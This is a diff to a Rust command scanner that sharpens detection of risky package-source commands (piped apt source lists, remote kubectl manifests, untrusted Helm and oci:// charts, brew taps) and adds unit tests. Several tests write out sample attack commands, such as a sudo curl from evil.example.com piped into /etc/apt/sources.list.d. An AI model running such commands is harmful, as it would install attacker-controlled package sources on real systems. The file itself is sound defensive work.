@@ -121,6 +121,17 @@ fn is_remote_url(value: &str) -> bool {
     v.starts_with("http://") || v.starts_with("https://") || v.starts_with("ftp://")
 }
 
+/// Whether a normalized arg is a remote chart location for the Helm rule.
+///
+/// This is [`is_remote_url`] plus `oci://`: a Helm chart is increasingly
+/// distributed from an OCI registry (`helm pull oci://…/chart`,
+/// `helm install --repo oci://…`). The file-scan side (`cifile.rs`) already
+/// treats `oci://` as a chart repository, so the command-line side must too —
+/// otherwise an `oci://` chart bypasses the untrusted-Helm detector entirely.
+fn is_helm_remote_url(value: &str) -> bool {
+    is_remote_url(value) || value.to_ascii_lowercase().starts_with("oci://")
+}
+
 /// Host of a git remote, accepting both `scheme://[user@]host/…` URLs and
 /// SCP-style SSH remotes (`[user@]host:path`, e.g. `git@github.com:u/r.git`).
 fn git_remote_host(remote: &str) -> Option<String> {
@@ -303,10 +314,11 @@ fn check_repo_add_from_pipe(
         }
         // The upstream stage should be a network fetch for this to be a
         // pipe-from-download; a local `cat` into tee is not the attack.
-        let upstream_base = segments[i - 1]
-            .command
-            .as_deref()
-            .map(|c| cmd_base(c, shell))
+        // Resolve the upstream through `resolve_command` so a privilege
+        // wrapper does not hide the fetch — `sudo curl … | tee …` has an
+        // upstream whose bare command base is `sudo`, not `curl`.
+        let upstream_base = resolve_command(&segments[i - 1], shell)
+            .map(|(base, _)| base)
             .unwrap_or_default();
         if !is_fetch_command(&upstream_base) {
             continue;
@@ -635,11 +647,10 @@ fn check_kubectl_apply_remote(
         if base != "kubectl" && base != "oc" {
             continue;
         }
-        // Only mutating subcommands that take a manifest file.
-        let subcmd = args
-            .iter()
-            .find(|a| !strip_quotes(a).starts_with('-'))
-            .map(|a| strip_quotes(a).to_ascii_lowercase());
+        // Only mutating subcommands that take a manifest file. A value-taking
+        // global flag (`kubectl --namespace prod apply …`) must not make the
+        // flag value look like the subcommand.
+        let subcmd = subcommand_after_global_flags(args, KUBECTL_VALUE_FLAGS);
         if !matches!(
             subcmd.as_deref(),
             Some("apply") | Some("create") | Some("replace")
@@ -733,34 +744,33 @@ fn check_helm_untrusted_repo(
         if base != "helm" {
             continue;
         }
-        let positionals: Vec<&str> = args
-            .iter()
-            .map(|a| strip_quotes(a))
-            .filter(|a| !a.starts_with('-'))
-            .collect();
-        let subcmd = positionals.first().map(|s| s.to_ascii_lowercase());
+        // The subcommand, skipping leading flags and the values of any
+        // value-taking helm globals (`helm --kubeconfig cfg repo add …` —
+        // `cfg` is the flag value, not the subcommand).
+        let subcmd = subcommand_after_global_flags(args, HELM_VALUE_FLAGS);
 
         // Any remote URL among the helm args (chart URL, `--repo <url>`, repo
-        // add target). `helm install foo ./local-chart` stays clean.
+        // add target). `oci://` counts — a Helm chart is commonly pulled from
+        // an OCI registry. `helm install foo ./local-chart` stays clean.
         let mut remote_url = None;
         for arg in args {
             let v = strip_quotes(arg);
-            // `--repo=https://...`
+            // `--repo=https://...` / `--repo=oci://...`
             let candidate = if let Some((flag, val)) = v.split_once('=') {
                 if flag == "--repo" || flag == "--repository" {
                     Some(val)
-                } else if is_remote_url(v) {
+                } else if is_helm_remote_url(v) {
                     Some(v)
                 } else {
                     None
                 }
-            } else if is_remote_url(v) {
+            } else if is_helm_remote_url(v) {
                 Some(v)
             } else {
                 None
             };
             if let Some(c) = candidate {
-                if is_remote_url(c) {
+                if is_helm_remote_url(c) {
                     remote_url = Some(c.to_string());
                     break;
                 }
@@ -769,7 +779,7 @@ fn check_helm_untrusted_repo(
         // `--repo <url>` (separate token).
         if remote_url.is_none() {
             for url in collect_flag_values(args, &["--repo", "--repository"]) {
-                if is_remote_url(&url) {
+                if is_helm_remote_url(&url) {
                     remote_url = Some(url);
                     break;
                 }
@@ -929,10 +939,10 @@ fn check_brew_untrusted_tap(
         if base != "brew" {
             continue;
         }
-        let subcmd = args
-            .iter()
-            .find(|a| !strip_quotes(a).starts_with('-'))
-            .map(|a| strip_quotes(a).to_ascii_lowercase());
+        // brew has no value-taking *global* flags before the subcommand, but
+        // route through the shared selector so the leading-flag skip is
+        // consistent with the kubectl/helm sites.
+        let subcmd = subcommand_after_global_flags(args, &[]);
 
         match subcmd.as_deref() {
             Some("install") | Some("reinstall") | Some("upgrade") => {
@@ -969,39 +979,42 @@ fn check_brew_untrusted_tap(
                 // means the tap is NOT the implied github.com/<user>/homebrew-<repo>.
                 for arg in args {
                     let v = strip_quotes(arg);
-                    if is_remote_url(v) || v.ends_with(".git") {
-                        // `git_remote_host` handles both `https://` URLs and
-                        // SCP-style SSH remotes (`git@github.com:u/r.git`).
-                        let host = git_remote_host(v).unwrap_or_default();
-                        // A github.com/gitlab.com tap URL is the normal case.
-                        let benign_host = host == "github.com"
-                            || host == "gitlab.com"
-                            || host == "bitbucket.org"
-                            || host.ends_with(".github.com")
-                            || host.ends_with(".gitlab.com");
-                        if benign_host {
-                            continue;
-                        }
-                        findings.push(Finding {
-                            rule_id: RuleId::BrewUntrustedTap,
-                            severity: Severity::Medium,
-                            title: "Homebrew tap from an arbitrary git remote".to_string(),
-                            description:
-                                "`brew tap` is pointed at an explicit git URL rather than the \
-                                 default GitHub-hosted tap. Every formula in a tap is executable \
-                                 Ruby — confirm the tap is from a source you trust."
-                                    .to_string(),
-                            evidence: vec![Evidence::CommandPattern {
-                                pattern: "brew tap <url>".to_string(),
-                                matched: redact::redact_shell_assignments(&seg.raw),
-                            }],
-                            human_view: None,
-                            agent_view: None,
-                            mitre_id: None,
-                            custom_rule_id: None,
-                        });
-                        return;
+                    // Only a real *remote* tap source is a finding: a URL
+                    // (`scheme://…`) or an SCP-style SSH remote
+                    // (`git@host:u/r.git`). A local path that merely ends in
+                    // `.git` — `brew tap acme/x ../homebrew-tap.git` (a local
+                    // bare repo) — is NOT a remote and must not fire.
+                    let Some(host) = git_remote_host(v) else {
+                        continue;
+                    };
+                    // A github.com/gitlab.com tap URL is the normal case.
+                    let benign_host = host == "github.com"
+                        || host == "gitlab.com"
+                        || host == "bitbucket.org"
+                        || host.ends_with(".github.com")
+                        || host.ends_with(".gitlab.com");
+                    if benign_host {
+                        continue;
                     }
+                    findings.push(Finding {
+                        rule_id: RuleId::BrewUntrustedTap,
+                        severity: Severity::Medium,
+                        title: "Homebrew tap from an arbitrary git remote".to_string(),
+                        description:
+                            "`brew tap` is pointed at an explicit git URL rather than the \
+                             default GitHub-hosted tap. Every formula in a tap is executable \
+                             Ruby — confirm the tap is from a source you trust."
+                                .to_string(),
+                        evidence: vec![Evidence::CommandPattern {
+                            pattern: "brew tap <url>".to_string(),
+                            matched: redact::redact_shell_assignments(&seg.raw),
+                        }],
+                        human_view: None,
+                        agent_view: None,
+                        mitre_id: None,
+                        custom_rule_id: None,
+                    });
+                    return;
                 }
             }
             _ => {}
@@ -1010,6 +1023,89 @@ fn check_brew_untrusted_tap(
 }
 
 // ── shared helpers ──────────────────────────────────────────────────────────
+
+/// kubectl / oc global flags that take a *separate* value token. When one
+/// precedes the subcommand (`kubectl --namespace prod apply -f …`), the flag's
+/// value (`prod`) must not be mistaken for the subcommand.
+///
+/// Only flags that genuinely consume a value are listed — a boolean global
+/// (`--insecure-skip-tls-verify`) must NOT be here, or the real subcommand
+/// would be wrongly skipped as its value.
+const KUBECTL_VALUE_FLAGS: &[&str] = &[
+    "-n",
+    "--namespace",
+    "-s",
+    "--server",
+    "--kubeconfig",
+    "--context",
+    "--cluster",
+    "--user",
+    "--token",
+    "--as",
+    "--as-group",
+    "--cache-dir",
+    "--certificate-authority",
+    "--client-certificate",
+    "--client-key",
+    "--request-timeout",
+    "--tls-server-name",
+];
+
+/// helm global flags that take a *separate* value token (same hazard as
+/// [`KUBECTL_VALUE_FLAGS`] — see there). Boolean globals (`--debug`) are
+/// deliberately excluded.
+const HELM_VALUE_FLAGS: &[&str] = &[
+    "-n",
+    "--namespace",
+    "--kubeconfig",
+    "--kube-context",
+    "--kube-apiserver",
+    "--kube-as-user",
+    "--kube-as-group",
+    "--kube-ca-file",
+    "--kube-token",
+    "--kube-tls-server-name",
+    "--registry-config",
+    "--repository-cache",
+    "--repository-config",
+    "--burst-limit",
+    "--qps",
+];
+
+/// Select a CLI subcommand from an arg list, skipping leading option flags and
+/// the *values* of known value-taking global flags.
+///
+/// The naive "first token not starting with `-`" is wrong when a value-taking
+/// global flag precedes the subcommand: `kubectl --namespace prod apply` would
+/// pick `prod`. `value_flags` is the curated set of globals that consume a
+/// following token (`--namespace prod`); a `--flag=value` form consumes no
+/// extra token. Returned lowercased to match the existing call sites.
+fn subcommand_after_global_flags(args: &[String], value_flags: &[&str]) -> Option<String> {
+    let mut i = 0;
+    while i < args.len() {
+        let a = strip_quotes(&args[i]);
+        if a == "--" {
+            // Everything after `--` is positional; the next token is it.
+            return args
+                .get(i + 1)
+                .map(|t| strip_quotes(t).to_ascii_lowercase());
+        }
+        // An option flag (`-x` / `--flag`); a lone `-` is not a flag.
+        if a.starts_with('-') && a.len() > 1 {
+            // `--flag=value` carries its own value and consumes no extra
+            // token; a bare value-taking flag consumes the following token.
+            if !a.contains('=') && value_flags.contains(&a) {
+                i += 2;
+            } else {
+                i += 1;
+            }
+            continue;
+        }
+        // First non-flag token — the subcommand.
+        return Some(a.to_ascii_lowercase());
+    }
+    None
+}
 
 /// Network-fetch commands whose output, piped into `tee`/redirected, means a
 /// repo definition came straight off the wire.
@@ -1090,6 +1186,36 @@ mod tests {
             ShellType::Posix,
             RuleId::RepoAddFromPipe,
         ));
+    }
+
+    #[test]
+    fn test_sudo_curl_pipe_tee_sources_list() {
+        // CR5: `sudo` wraps the *upstream* fetch. The upstream segment's bare
+        // command base is `sudo`, not `curl` — it must be resolved through
+        // `resolve_command` so the fetch is still recognised.
+        assert!(
+            has(
+                "sudo curl -fsSL https://evil.example.com/repo.list | sudo tee \
+                 /etc/apt/sources.list.d/evil.list",
+                ShellType::Posix,
+                RuleId::RepoAddFromPipe,
+            ),
+            "a sudo-wrapped upstream fetch piped to tee sources.list must fire"
+        );
+    }
+
+    #[test]
+    fn test_local_cat_pipe_tee_sources_list_no_fire() {
+        // The upstream is a local `cat`, not a network fetch — even resolved
+        // through a privilege wrapper this is not the pipe-from-download
+        // attack and must NOT fire.
+        assert!(
+            none(
+                "sudo cat ./local.list | sudo tee /etc/apt/sources.list.d/x.list",
+                ShellType::Posix,
+            ),
+            "a sudo-wrapped local `cat` into tee is not a download and must stay clean"
+        );
     }
 
     #[test]
@@ -1314,6 +1440,38 @@ mod tests {
         ));
     }
 
+    #[test]
+    fn test_kubectl_global_namespace_flag_before_subcommand() {
+        // CR6: a value-taking global flag (`--namespace prod`) precedes the
+        // subcommand. `prod` must not be mistaken for the subcommand — the
+        // real `apply` must still be recognised.
+        assert!(
+            has(
+                "kubectl --namespace prod apply -f \
+                 https://raw.githubusercontent.com/x/y/main/deploy.yaml",
+                ShellType::Posix,
+                RuleId::KubectlApplyRemote,
+            ),
+            "a value-taking global flag before `apply` must not hide the subcommand"
+        );
+        // Short form `-n prod` likewise.
+        assert!(has(
+            "kubectl -n prod apply -f https://raw.githubusercontent.com/x/y/main/deploy.yaml",
+            ShellType::Posix,
+            RuleId::KubectlApplyRemote,
+        ));
+    }
+
+    #[test]
+    fn test_kubectl_global_flag_get_still_no_fire() {
+        // The flag-skipping must not turn a non-mutating `get` into `apply`:
+        // `kubectl --namespace prod get …` is still clean.
+        assert!(none(
+            "kubectl --namespace prod get pods -o yaml",
+            ShellType::Posix,
+        ));
+    }
+
     // ── helm_untrusted_repo ─────────────────────────────────────────────────
 
     #[test]
@@ -1350,6 +1508,64 @@ mod tests {
     #[test]
     fn test_helm_list_no_fire() {
         assert!(none("helm list -A", ShellType::Posix));
+    }
+
+    #[test]
+    fn test_helm_global_kubeconfig_flag_before_subcommand() {
+        // CR6: a value-taking helm global (`--kubeconfig cfg`) precedes the
+        // `repo add` subcommand. `cfg` must not be mistaken for the subcommand.
+        assert!(
+            has(
+                "helm --kubeconfig /tmp/cfg repo add evil https://charts.evil.example.com",
+                ShellType::Posix,
+                RuleId::HelmUntrustedRepo,
+            ),
+            "a value-taking global flag before `repo add` must not hide the subcommand"
+        );
+        // Short `-n ns` likewise, with `install`.
+        assert!(has(
+            "helm -n prod install myapp mychart --repo https://charts.evil.example.com",
+            ShellType::Posix,
+            RuleId::HelmUntrustedRepo,
+        ));
+    }
+
+    #[test]
+    fn test_helm_pull_oci_untrusted_flagged() {
+        // CR7: a chart pulled from an OCI registry. `oci://` was not promoted
+        // to a remote URL on the exec path, so this previously bypassed the
+        // detector entirely.
+        assert!(
+            has(
+                "helm pull oci://evil.example.com/charts/app",
+                ShellType::Posix,
+                RuleId::HelmUntrustedRepo,
+            ),
+            "a helm pull from an untrusted oci:// registry must fire"
+        );
+    }
+
+    #[test]
+    fn test_helm_install_oci_repo_flag_untrusted_flagged() {
+        // CR7: `--repo oci://…` on the exec path must also be promoted.
+        assert!(has(
+            "helm install myapp mychart --repo oci://evil.example.com/charts",
+            ShellType::Posix,
+            RuleId::HelmUntrustedRepo,
+        ));
+    }
+
+    #[test]
+    fn test_helm_pull_oci_trusted_no_fire() {
+        // An `oci://` chart from a recognised registry (ghcr.io) must NOT fire
+        // — the CR7 change adds `oci://` coverage without flagging trusted hosts.
+        assert!(
+            none(
+                "helm pull oci://ghcr.io/some-org/charts/app",
+                ShellType::Posix,
+            ),
+            "an oci:// chart from a trusted registry must stay clean"
+        );
     }
 
     // ── terraform_remote_module ─────────────────────────────────────────────
@@ -1444,6 +1660,34 @@ mod tests {
             "brew tap user/repo https://github.com/user/homebrew-repo",
             ShellType::Posix,
         ));
+    }
+
+    #[test]
+    fn test_brew_tap_local_bare_repo_path_no_fire() {
+        // CR8: a local bare-repo tap path that merely ends in `.git` is NOT a
+        // remote — `git_remote_host` yields no host, so it must not be
+        // reported as an arbitrary remote tap.
+        assert!(
+            none(
+                "brew tap acme/internal ../homebrew-tap.git",
+                ShellType::Posix,
+            ),
+            "a local `.git` bare-repo tap path must not be flagged as a remote"
+        );
+        assert!(
+            none(
+                "brew tap acme/internal ./taps/homebrew-internal.git",
+                ShellType::Posix,
+            ),
+            "a relative local `.git` tap path must not fire"
+        );
+        assert!(
+            none(
+                "brew tap acme/internal /srv/git/homebrew-internal.git",
+                ShellType::Posix,
+            ),
+            "an absolute local `.git` tap path must not fire"
+        );
     }
 
     // ── wrapper resolution ──────────────────────────────────────────────────
